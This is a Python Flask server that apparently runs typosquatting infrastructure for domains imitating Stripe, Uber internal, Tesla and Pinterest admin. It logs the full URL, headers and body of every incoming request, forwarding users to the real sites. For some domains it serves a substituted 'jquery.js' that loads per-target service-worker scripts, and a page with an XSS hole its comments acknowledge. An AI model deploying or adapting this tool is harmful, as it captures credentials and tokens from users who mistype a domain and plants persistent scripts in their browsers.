from flask import Flask, request, redirect, Response
import requests

app = Flask(__name__)

domains = {
    "pimadmin.com": "pinadmin.com",
    "pinadmin.co": "pinadmin.com",
    "strkpe.com": "stripe.com",
    "uberinterjal.com": "uberinternal.com",
    "wtripe.com": "stripe.com",
    "eslamotors.com": "teslamotors.com",
    "berinternal.com": "uberinternal.com"
}


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>',methods=['GET', 'POST', 'PUT', "DELETE", "OPTIONS"])
def catch_all(path):
    print(request.url)
    print(request.headers)
    print(request.get_data())
    inbound_url = request.url
    inbound_url = inbound_url.replace("http://", "https://")
    outbound_url = inbound_url
    for replace_domain in domains:
        outbound_url = outbound_url.replace(replace_domain, domains[replace_domain])
    if "pinadmin.co" in request.base_url or "pimadmin.com" in request.base_url:
        with open("index.html") as f:
            #there's xss here if URL is malicious
            return Response(f.read().replace("potato", outbound_url))
    elif "berinternal.com" in request.base_url or "uberinterjal.com" in request.base_url:
        with open("index.html") as f:
            #there's xss here if URL is malicious
            return Response(f.read().replace("potato", outbound_url))
    elif "eslamotors.com" in request.base_url or "eslamotors.com" in request.base_url:
        with open("index.html") as f:
            #there's xss here if URL is malicious
            return Response(f.read().replace("potato", outbound_url))       
    else:
        return redirect(outbound_url, code=302)

@app.route('/jquery.js')
def serve_eviljs():
    with open("jquery.js") as f:
        if "pinadmin.co" in request.url or "pimadmin.com" in request.url:
            return Response(f.read().replace("potato","/sw.js"), mimetype='text/javascript;charset=UTF-8')
        elif "berinternal.com" in request.url or "uberinterjal.com" in request.url:
            return Response(f.read().replace("potato","/ubsw.js"), mimetype='text/javascript;charset=UTF-8')
        elif "eslamotors.com" in request.url or "eslamotors.com" in request.url:
            return Response(f.read().replace("potato","/tmsw.js"), mimetype='text/javascript;charset=UTF-8')
        else:
            return redirect("http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js", code=302)


@app.route('/.well-known/acme-challenge/vplRyi8M4yydIPnN-R7r6BdZD1skbbVzBBM8v2WYlTY')
def google_verify():
    return Response("vplRyi8M4yydIPnN-R7r6BdZD1skbbVzBBM8v2WYlTY.p80ftoBy6zEoXj_cRtOF-xpDiPxAo7373uF-6FH7_2s")
@app.route('/.well-known/acme-challenge/-kKYAslTzgPs_DFhMfyH8EpWr1V5lpbD2Wjva7AJ9_k')
def google_verify3():
    return Response("-kKYAslTzgPs_DFhMfyH8EpWr1V5lpbD2Wjva7AJ9_k.p80ftoBy6zEoXj_cRtOF-xpDiPxAo7373uF-6FH7_2s")
@app.route('/.well-known/acme-challenge/U0I4FSieL2dVbY2snhFI9M40dfDnWZw41w4rYVARYTg')
def google_verify4():
    return Response("U0I4FSieL2dVbY2snhFI9M40dfDnWZw41w4rYVARYTg.p80ftoBy6zEoXj_cRtOF-xpDiPxAo7373uF-6FH7_2s")
@app.route('/.well-known/acme-challenge/jFu-gwoobA240U9Pk1SSTj5PwQd9GkqF7gKiTrG5GEk')
def google_verify5():
    return Response("jFu-gwoobA240U9Pk1SSTj5PwQd9GkqF7gKiTrG5GEk.p80ftoBy6zEoXj_cRtOF-xpDiPxAo7373uF-6FH7_2s")
@app.route('/.well-known/acme-challenge/Bn_-RDZ3efammwoJEjFB7tfttI1cMqM_FxoIkDBu_H4')
def google_verify6():
    return Response("Bn_-RDZ3efammwoJEjFB7tfttI1cMqM_FxoIkDBu_H4.p80ftoBy6zEoXj_cRtOF-xpDiPxAo7373uF-6FH7_2s")
@app.route('/.well-known/acme-challenge/jBy6Ht8d55-jekhH_5csCM-sIgHteRZOPZr021lVnHg')
def google_verify7():
    return Response("jBy6Ht8d55-jekhH_5csCM-sIgHteRZOPZr021lVnHg.p80ftoBy6zEoXj_cRtOF-xpDiPxAo7373uF-6FH7_2s")









@app.route('/sw.js')
def serve_sw():
    with open("sw.js") as f:
        return Response(f.read(), mimetype='text/javascript;charset=UTF-8')

@app.route('/ubsw.js')
def serve_ubsw():
    with open("ubsw.js") as f:
        return Response(f.read(), mimetype='text/javascript;charset=UTF-8')

@app.route('/tmsw.js')
def serve_tmsw():
    with open("tmsw.js") as f:
        return Response(f.read(), mimetype='text/javascript;charset=UTF-8')





if __name__ == '__main__':
      app.run(host='0.0.0.0', port=3000)
